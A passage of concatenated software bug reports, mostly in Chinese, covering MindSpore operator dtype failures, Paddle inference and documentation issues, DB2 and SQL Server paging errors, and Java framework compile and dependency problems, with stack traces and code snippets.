auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_list = _to_full_tensor(args, _get_device_num(), _get_global_rank()) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E TypeError: Select GPU operator[MulNoNan] fail! Unsupported data type! E The supported data types are input[Bool Bool], output[Bool]; input[UInt8 UInt8], output[Bool]; input[UInt16 UInt16], output[Bool]; input[UInt32 UInt32], output[Bool]; input[UInt64 UInt64], output[Bool]; input[Int8 Int8], output[Bool]; input[Int16 Int16], output[Bool]; input[Int32 Int32], output[Bool]; input[Int64 Int64], output[Bool]; input[Float16 Float16], output[Bool]; input[Float32 Float32], output[Bool]; input[Float64 Float64], output[Bool]; input[Bool Bool], output[Bool]; input[UInt8 UInt8], output[UInt8]; input[UInt16 UInt16], output[UInt16]; input[UInt32 UInt32], output[UInt32]; input[UInt64 UInt64], output[UInt64]; input[Int8 Int8], output[Int8]; input[Int16 Int16], output[Int16]; input[Int32 Int32], output[Int32]; input[Int64 Int64], output[Int64]; input[Float16 Float16], output[Float16]; input[Float32 Float32], output[Float32]; input[Float64 Float64], output[Float64]; , but get input[Complex64 Complex64 ] output[Complex64 ] E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:551 SetOperatorInfo def test_mulnonan_inputx_5d_complex128_inputy_5d_complex128(): input_list = [] input_list.append(Tensor(np.random.randn(4, 2, 12, 1, 8) + 1j * np.random.randn(4, 2, 12, 1, 8), dtype=mstype.complex128)) input_list.append(Tensor(np.random.randn(4, 2, 12, 1, 8) + 1j * np.random.randn(4, 2, 12, 1, 8), dtype=mstype.complex128)) fact = MulNoNanMock(inputs=input_list) fact.loss = 2e-10 &gt; fact.forward_cmp() test_mulnonan.py:659: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/mulnonan_ops.py:98: in forward_cmp out_me = self.forward_mindspore_impl() ../share/ops/primitive/mulnonan_ops.py:51: in forward_mindspore_impl out = net(self.input_x, self.input_y) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:573: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:956: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:929: in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fd565800410&gt;, obj = WrapOp&lt;&gt;, phase = 'train.1656401161993176576.140545256312656.52' do_convert = True, auto_parallel_mode = False args = (Tensor(shape=[4, 2, 12, 1, 8], dtype=Complex128, value= [[[[[1.47224+2.83269j, -0.030505+1.34966j, 0.786587+1.62807j ...757+1.2497j, -0.214836-0.547504j, 0.815179-1.01151j ... 0.285927+1.36722j, 1.28253+0.258837j, -1.03419+0.564275j]]]]])) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_list = _to_full_tensor(args, _get_device_num(), _get_global_rank()) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E TypeError: Select GPU operator[MulNoNan] fail! Unsupported data type! E The supported data types are input[Bool Bool], output[Bool]; input[UInt8 UInt8], output[Bool]; input[UInt16 UInt16], output[Bool]; input[UInt32 UInt32], output[Bool]; input[UInt64 UInt64], output[Bool]; input[Int8 Int8], output[Bool]; input[Int16 Int16], output[Bool]; input[Int32 Int32], output[Bool]; input[Int64 Int64], output[Bool]; input[Float16 Float16], output[Bool]; input[Float32 Float32], output[Bool]; input[Float64 Float64], output[Bool]; input[Bool Bool], output[Bool]; input[UInt8 UInt8], output[UInt8]; input[UInt16 UInt16], output[UInt16]; input[UInt32 UInt32], output[UInt32]; input[UInt64 UInt64], output[UInt64]; input[Int8 Int8], output[Int8]; input[Int16 Int16], output[Int16]; input[Int32 Int32], output[Int32]; input[Int64 Int64], output[Int64]; input[Float16 Float16], output[Float16]; input[Float32 Float32], output[Float32]; input[Float64 Float64], output[Float64]; , but get input[Complex128 Complex128 ] output[Complex128 ] E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:551 SetOperatorInfo"
[BUG] 代码中&编译问题,"这里的&amp;会编译不通过，报错如下：   <code>: 2021-04-19 09:54:51.355 ERROR 11715 --- [o-10000-exec-10] o.s.magicapi.controller.RequestHandler : 测试脚本出错 org.ssssssss.magicapi.exception.MagicAPIException: 编译MagicScript出错 at org.ssssssss.magicapi.script.ScriptManager.compile(ScriptManager.java:37) ~[magic-api-1.0.2.jar:1.0.2] at org.ssssssss.magicapi.script.ScriptManager.executeScript(ScriptManager.java:56) ~[magic-api-1.0.2.jar:1.0.2] at org.ssssssss.magicapi.controller.RequestHandler.invokeTestRequest(RequestHandler.java:234) [magic-api-1.0.2.jar:1.0.2] at org.ssssssss.magicapi.controller.RequestHandler.invoke(RequestHandler.java:115) [magic-api-1.0.2.jar:1.0.2] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_121] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_121] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_121] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_121] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) [spring-web-5.3.5.jar:5.3.5] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) [spring-web-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) [spring-webmvc-5.3.5.jar:5.3.5] at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) [tomcat-embed-core-9.0.44.jar:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.3.5.jar:5.3.5] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) [tomcat-embed-core-9.0.44.jar:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) [tomcat-embed-websocket-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.ssssssss.example.filter.RequserAgainFilter.doFilterInternal(RequserAgainFilter.java:27) [classes/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.3.5.jar:5.3.5] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) [spring-web-5.3.5.jar:5.3.5] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.3.5.jar:5.3.5] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.ssssssss.magicapi.config.MagicCorsFilter.doFilter(MagicCorsFilter.java:42) [magic-api-1.0.2.jar:1.0.2] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.44.jar:9.0.44] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_121] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_121] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.44.jar:9.0.44] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_121] Caused by: org.ssssssss.script.exception.MagicScriptException: Unknown token at Row:15~15,Col:45~45 stmp = Integer.toHexString(array[n] &amp; 0XFF); ^ at org.ssssssss.script.MagicScriptError.error(MagicScriptError.java:62) ~[magic-script-1.4.3.jar:na] at org.ssssssss.script.MagicScriptError.error(MagicScriptError.java:73) ~[magic-script-1.4.3.jar:na] at org.ssssssss.script.parsing.Tokenizer.tokenize(Tokenizer.java:214) ~[magic-script-1.4.3.jar:na] at org.ssssssss.script.parsing.Parser.parse(Parser.java:62) ~[magic-script-1.4.3.jar:na] at org.ssssssss.script.MagicScript.create(MagicScript.java:32) ~[magic-script-1.4.3.jar:na] at org.ssssssss.script.MagicScriptEngine.compile(MagicScriptEngine.java:178) ~[magic-script-1.4.3.jar:na] at org.ssssssss.magicapi.script.ScriptManager.compile(ScriptManager.java:35) ~[magic-api-1.0.2.jar:1.0.2] ... 60 common frames omitted"
lstm C  与python预测不一致,"输入python C++ 预测两个结果不同   <code>: fluid.data(name='x', shape=[10, 36], dtype='float32', lod_level=1) std::vector&lt;float&gt; features; // size() = 360 paddle::PaddleTensor tensor; tensor.shape = std::vector&lt;int&gt;({10, 36}); tensor.data = paddle::PaddleBuf(features.data(), features.size() * sizeof(float)); tensor.lod = {{1, 10}}; tensor.dtype = paddle::PaddleDType::FLOAT32;"
sql中包含递归得到的分页sql执行报错,"原sql 分页后的SQL:   <code>: WITH RPL ( id,pid) AS ( SELECT ROOT.id,ROOT.pid FROM t_org ROOT where ROOT.id=#{treeOrgId} UNION ALL SELECT CHILD.id,CHILD.pid FROM RPL PARENT, t_org CHILD WHERE PARENT.id= CHILD.pid ) select u.ID,u.LOGIN_ID,u.USER_NAME,u.PASSWORD,u.JOB,u.GENDER,u.TEL,u.PHONE,u.EMAIL,u.DEADLINE_TYPE,u.EXPIRY_DATE,u.REMARK,u.STATE,u.BUREAU_ID,u.OPERATOR_TYPE,u.BRANS_NAME from t_user u where u.id in ( select uo.userid from t_user_org uo where uo.orgid in( select RPL.id from RPL ) ) select * from (select tmp_page.*,rownumber() over() as row_id from ( WITH RPL ( id,pid) AS ( SELECT ROOT.id,ROOT.pid FROM t_org ROOT where ROOT.id=0 UNION ALL SELECT CHILD.id,CHILD.pid FROM RPL PARENT, t_org CHILD WHERE PARENT.id= CHILD.pid ) select u.ID,u.PASSWORD from t_user u where u.id in ( select uo.userid from t_user_org uo where uo.orgid in( select RPL.id from RPL ) ) order by id desc ) as tmp_page) where row_id between ? and ? org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: com.ibm.db2.jcc.am.io: DB2 SQL Error: SQLCODE=-104, SQLSTATE=42601, SQLERRMC=AS;WITH RPL ( id,pid);JOIN, DRIVER=3.57.82 ### The error may exist in com/github/pagehelper/mapper/UserMapper.xml ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### SQL: select * from (select tmp_page.*,rownumber() over() as row_id from ( WITH RPL ( id,pid) AS ( SELECT ROOT.id,ROOT.pid FROM t_org ROOT where ROOT.id=0 UNION ALL SELECT CHILD.id,CHILD.pid FROM RPL PARENT, t_org CHILD WHERE PARENT.id= CHILD.pid ) select u.ID,u.PASSWORD from t_user u where u.id in ( select uo.userid from t_user_org uo where uo.orgid in( select RPL.id from RPL ) ) order by id desc ) as tmp_page) where row_id between ? and ? ### Cause: com.ibm.db2.jcc.am.io: DB2 SQL Error: SQLCODE=-104, SQLSTATE=42601, SQLERRMC=AS;WITH RPL ( id,pid);JOIN, DRIVER=3.57.82 at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:26) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:111) at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:117) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:63) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:52) at $Proxy9.findUserListByOrgIdUsePaging(Unknown Source) at com.github.pagehelper.test.rowbounds.RowBoundsTest.testMapperUser(RowBoundsTest.java:95) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.junit.runner.JUnitCore.run(JUnitCore.java:160) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:78) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:212) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:68) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:140) Caused by: com.ibm.db2.jcc.am.io: DB2 SQL Error: SQLCODE=-104, SQLSTATE=42601, SQLERRMC=AS;WITH RPL ( id,pid);JOIN, DRIVER=3.57.82 at com.ibm.db2.jcc.am.bd.a(bd.java:676) at com.ibm.db2.jcc.am.bd.a(bd.java:60) at com.ibm.db2.jcc.am.bd.a(bd.java:127) at com.ibm.db2.jcc.am.km.c(km.java:2506) at com.ibm.db2.jcc.am.km.d(km.java:2483) at com.ibm.db2.jcc.am.km.a(km.java:1963) at com.ibm.db2.jcc.t4.db.g(db.java:139) at com.ibm.db2.jcc.t4.db.a(db.java:39) at com.ibm.db2.jcc.t4.t.a(t.java:32) at com.ibm.db2.jcc.t4.sb.h(sb.java:135) at com.ibm.db2.jcc.am.km.eb(km.java:1934) at com.ibm.db2.jcc.am.lm.ic(lm.java:2798) at com.ibm.db2.jcc.am.lm.b(lm.java:3517) at com.ibm.db2.jcc.am.lm.Yb(lm.java:2130) at com.ibm.db2.jcc.am.lm.execute(lm.java:2114) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:62) at $Proxy11.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.query(PreparedStatementHandler.java:59) at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:73) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:60) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:267) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:137) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:96) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:77) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at com.github.pagehelper.SqlUtil._processPage(SqlUtil.java:405) at com.github.pagehelper.SqlUtil.processPage(SqlUtil.java:329) at com.github.pagehelper.PageHelper.intercept(PageHelper.java:150) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:60) at $Proxy8.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:108) ... 31 more"
导出对象的子列表，当子列表 size = 1 时，导出数据错误,http://doc.ruoyi.vip/ruoyi/document/htsc.html#%E5%AF%BC%E5%87%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%AD%90%E5%88%97%E8%A1%A8 解决方法：ExcelUtil类addCell方法的 修改为   <code>: if (isSubListValue(vo) &amp;&amp; attr.needMerge()) { if (isSubListValue(vo) &amp;&amp; getListCellValue(vo).size() &gt; 1 &amp;&amp; attr.needMerge()) {
SqlServer ToPageList排序顺序问题 和 DISTINCT 问题,"现在的ToPageList是 目前发现, 需要在最后添加ORDER BY RowIndex, 不然可能出现排序无效的问题. 当原查询中有DISTINCT, 此方式会出现此问题并使DISTINCT无效, 建议把RowIndex拿到外面的查询中. 异常复现: 数据库: SQLSERVER 2019 服务器版本:15.00.2080 表结构: 数据:   <code>: SELECT * FROM ( SELECT ..., ROW_NUMBER() OVER ( ... ) AS RowIndex -- 这里是原语句的排序子句 FROM ... ... ) T WHERE RowIndex BETWEEN 1 AND 30 -- 第一页, 30行/页 -- 需要添加的部分 -- ORDER BY RowIndex -- test 表 CREATE TABLE [dbo].[test] ( [id] int NOT NULL, [name] varchar(255) COLLATE Chinese_PRC_CI_AS NULL, [value] int NULL, CONSTRAINT [PK__test__3213E83F3568C3A6] PRIMARY KEY CLUSTERED ([id]) WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY] ) ON [PRIMARY] GO -- test2表 CREATE TABLE [dbo].[test2] ( [id] int NOT NULL, [value] varchar(255) COLLATE Chinese_PRC_CI_AS NULL ) ON [PRIMARY] GO )"
paddle实现双线性插值的api不完善，需要补充。,"在paddle的nn.py发现双线性插值的说明文档，这样写的： Bilinear interpolation: 然后本能的以为只有两种双线性插值的方式，但是后面查阅了代码才发现，其实有四种方式。是否可以在api里面写清楚，四种不同方式走的怎样的逻辑？   <code>: if: align_corners = False , align_mode = 0 input : (N,C,H_in,W_in) output: (N,C,H_out,W_out) where: H_out = (H_{in}+0.5) * scale_{factor} - 0.5 W_out = (W_{in}+0.5) * scale_{factor} - 0.5 else: input : (N,C,H_in,W_in) output: (N,C,H_out,W_out) where: H_out = H_{in} * scale_{factor} W_out = W_{in} * scale_{factor}"
LogEntityFrameworkCoreSqlExecuteCommand 生效范围问题,Furion 版本号 2.11.6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp https://dotnetchina.gitee.io/furion/docs/settings/appsettings 应用配置中描述，：是否记录 执行 日志，默认 经过测试查阅代码，此参数影响的是直接 sql 执行日志输出。而 EFCore 的日志输入是不受此参数影响 文档中给人的感觉是整体的控制开关 无 代码或代码仓库 是否考虑   <code>: LogEntityFrameworkCoreSqlExecuteCommand EFCore sql true
【众智】【计算-AICPU开发】BiasAddGrad,"AICPU算子接入 BiasAdd的反向 接口目录：mindspore/ops/operations/_grad_ops.py x data_format String 属性 y 对应底层算子 对应底层AICPU算子BiasAddGrad TF接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/BiasAddGrad 3. 异常处理 4. 算子反向 无反向   <code>: class BiasAddGrad(Primitive): REG_OP(BiasAddGrad) .INPUT(x, TensorType::NumberType()) .OUTPUT(y, TensorType::NumberType()) .ATTR(data_format, String, ""NHWC"") .OP_END_FACTORY_REG(BiasAddGrad)"
打包之后unitechs-monitor报错,尝试替换了版本，依然报错   <code>: &lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; &lt;version&gt;${spring-boot-admin.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;io.projectreactor.netty&lt;/groupId&gt; &lt;artifactId&gt;reactor-netty&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.projectreactor.netty&lt;/groupId&gt; &lt;artifactId&gt;reactor-netty&lt;/artifactId&gt; &lt;version&gt;0.9.10.RELEASE&lt;/version&gt; &lt;/dependency&gt;
Memory leaks when doing CPU inference with MKLDNN,"System information Paddle version: 1.8.2 Paddle With CUDA: False OS: Ubuntu 16.04 CPU: 16 Intel(R) Xeon(R) CPU E5-2620 v3 @ 2.40GHz Python version: 3.5.2 CUDA version: 9.0.176 cuDNN version: None.None.None Nvidia driver version: None API information: inference configuration To Reproduce download models and data ocr detection model ocr recognition model test data The test data pictures are binary files saved with , and can be loaded with . perform inference with mkldnn code to reproduce: test_ocr_mkldnn_mem.txt(rename to test_ocr_mkldnn_mem.py) detection recognition Memory usage increasing can be witnessed with command. <ol start=""3""> perform inference without mkldnn detection recognition Memory usage will maintain stable. The input shapes we use in OCR are dynamic, which might be relevant to this issue.   <code>: config.disable_gpu() config.enable_mkldnn() config.set_cpu_math_library_num_threads(4) np.save np.load python3 test_ocr_mkldnn_mem.py --model_file=./ch_det_mv3_db/model --params_file=./ch_det_mv3_db/params --mode=det --mkldnn python3 test_ocr_mkldnn_mem.py --model_file=./ch_rec_mv3_crnn/model --params_file=./ch_rec_mv3_crnn/params --mode=rec --mkldnn top python3 test_ocr_mkldnn_mem.py --model_file=./ch_det_mv3_db/model --params_file=./ch_det_mv3_db/params --mode=det python3 test_ocr_mkldnn_mem.py --model_file=./ch_rec_mv3_crnn/model --params_file=./ch_rec_mv3_crnn/params --mode=rec"
